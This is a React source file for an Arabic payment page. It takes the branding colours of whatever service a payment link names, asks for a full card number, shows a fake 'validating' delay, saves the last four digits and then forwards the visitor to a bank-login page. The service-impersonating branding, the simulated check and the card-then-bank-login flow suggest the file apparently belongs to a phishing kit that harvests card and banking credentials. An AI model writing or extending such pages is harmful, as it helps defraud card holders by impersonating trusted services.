import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentRouterStandalone from "@/components/PaymentRouterStandalone";
import { CreditCard, ArrowLeft } from "lucide-react";

const StandalonePaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };

  return (
    <PaymentRouterStandalone>
      {(linkData) => {
        const serviceKey = linkData.service_key;
        const serviceName = linkData.service_name;
        const branding = getServiceBranding(serviceKey);

        const handleSubmit = async (e: React.FormEvent) => {
          e.preventDefault();
          setIsLoading(true);

          // Simulate card validation
          await new Promise(resolve => setTimeout(resolve, 1000));

          const last4 = cardNumber.replace(/\s/g, "").slice(-4);
          sessionStorage.setItem('cardLast4', last4);

          setIsLoading(false);
          navigate(`/standalone-pay/${id}/bank-login`);
        };

        return (
          <div className="min-h-screen bg-background" dir="rtl">
            <div className="container mx-auto px-3 sm:px-4 py-8">
              <div className="max-w-2xl mx-auto">
                <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
                  <form onSubmit={handleSubmit}>
                    <div className="flex items-center justify-between mb-6 sm:mb-8">
                      <h1 className="text-xl sm:text-3xl font-bold">رقم البطاقة</h1>
                      <div
                        className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                        style={{
                          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                        }}
                      >
                        <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                      </div>
                    </div>

                    <div className="space-y-4 mb-6">
                      <div>
                        <Label className="mb-2 text-sm sm:text-base">رقم البطاقة</Label>
                        <Input
                          type="text"
                          placeholder="#### #### #### ####"
                          value={cardNumber}
                          onChange={(e) =>
                            setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
                          }
                          inputMode="numeric"
                          className="h-12 sm:h-14 text-base sm:text-lg tracking-wider"
                          required
                        />
                      </div>
                    </div>

                    <Button
                      type="submit"
                      size="lg"
                      className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                      disabled={isLoading}
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                      }}
                    >
                      {isLoading ? (
                        <span>جارٍ التحقق...</span>
                      ) : (
                        <>
                          <span className="ml-2">التالي</span>
                          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                        </>
                      )}
                    </Button>
                  </form>
                </Card>
              </div>
            </div>
          </div>
        );
      }}
    </PaymentRouterStandalone>
  );
};

export default StandalonePaymentCardInput;
